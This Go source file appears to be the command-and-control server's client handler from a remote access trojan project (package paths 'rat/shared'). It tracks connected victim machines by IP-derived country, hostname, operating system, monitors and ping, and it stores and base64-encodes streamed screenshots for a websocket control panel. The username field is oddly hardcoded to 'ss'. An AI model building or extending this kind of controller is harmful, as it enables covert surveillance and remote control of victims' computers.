package main

import (
	"encoding/base64"
	"encoding/binary"
	"math/rand"
	"net"
	"rat/shared"
	"rat/shared/network"
	"rat/shared/network/header"

	"strconv"
	"strings"
	"time"

	"golang.org/x/net/websocket"
)

type listenerMap map[header.PacketHeader]*websocket.Conn

type Client struct {
	network.Writer
	network.Reader

	Conn net.Conn

	Id int

	shared.Computer
	Country     string
	CountryCode string

	Ping struct {
		Start    time.Time
		Current  int
		Received bool
	}

	Screen struct {
		Streaming bool
		New       bool
		Buffer    []byte
	}

	Queue chan OutgoingPacket

	Listeners listenerMap

	Monitors []shared.Monitor

	Authenticated bool
}

func NewClient(conn net.Conn) *Client {
	client := new(Client)

	client.Queue = make(chan OutgoingPacket)

	client.Conn = conn
	client.Id = int(rand.Int31())
	client.Computer = shared.Computer{}
	client.Country, client.CountryCode = GetCountry(client.GetIP())
	client.Listeners = make(map[header.PacketHeader]*websocket.Conn)
	client.Monitors = make([]shared.Monitor, 0)

	return client
}

func (c *Client) GetDisplayHost() string {
	return c.Conn.RemoteAddr().String()
}

func (c *Client) GetIP() string {
	return strings.Split(c.Conn.RemoteAddr().String(), ":")[0]
}

// GetFlagName returns the flag filename without extension for the client
// If connection is inside a local network, use "local" icon
// If a country is not found for this clients IP address, return a "unknown" icon
func (c *Client) GetFlagName() string {
	name := strings.ToLower(c.CountryCode)

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "local"
		default:
			name = "unknown"
		}
	}

	return name
}

// GetCountry returns the full country name for the client
func (c *Client) GetCountry() string {
	name := c.Country

	if name == "" {
		switch c.GetIP() {
		case "127.0.0.1":
			name = "Local Network"
		default:
			name = "Unknown"
		}
	}

	return name
}

// GetPing returns the current ping in milliseconds followed by " ms"
func (c *Client) GetPing() string {
	return strconv.Itoa(c.Ping.Current) + " ms"
}

func (c *Client) GetPathSep() string {
	if c.Computer.OperatingSystemType == shared.Windows {
		return "\\"
	}

	return "/"
}

// Heartbeat pings the client and waits
func (c *Client) Heartbeat() {
	for {
		c.Queue <- &Ping{}

		for !c.Ping.Received {
			time.Sleep(time.Millisecond)
		}

		time.Sleep(time.Second * 2)
	}
}

func (c *Client) ReadHeader() (header.PacketHeader, error) {
	var h header.PacketHeader
	err := binary.Read(c.Conn, shared.ByteOrder, &h)

	return h, err
}

func (c *Client) WriteHeader(header header.PacketHeader) error {
	return binary.Write(c.Conn, shared.ByteOrder, header)
}

func (c *Client) WritePacket(packet OutgoingPacket) error {
	err := c.WriteHeader(packet.Header())

	if err != nil {
		return err
	}

	return c.Writer.WritePacket(packet)
}

// GetEncodedScreen returns a base64 encoded version of the most recent screenshot
func (c *Client) GetEncodedScreen() string {
	return base64.StdEncoding.EncodeToString(c.Screen.Buffer)
}

func (c *Client) GetClientData() ClientData {
	return ClientData{
		Ping:     c.Ping.Current,
		Country:  c.GetCountry(),
		Flag:     c.GetFlagName(),
		Host:     c.GetDisplayHost(),
		Hostname: c.Computer.GetDisplayName(),
		Username: "ss",
		Monitors: c.Monitors,
		OperatingSystem: OperatingSystem{
			Type:    c.OperatingSystemType,
			Display: c.Computer.OperatingSystem,
		},
	}
}
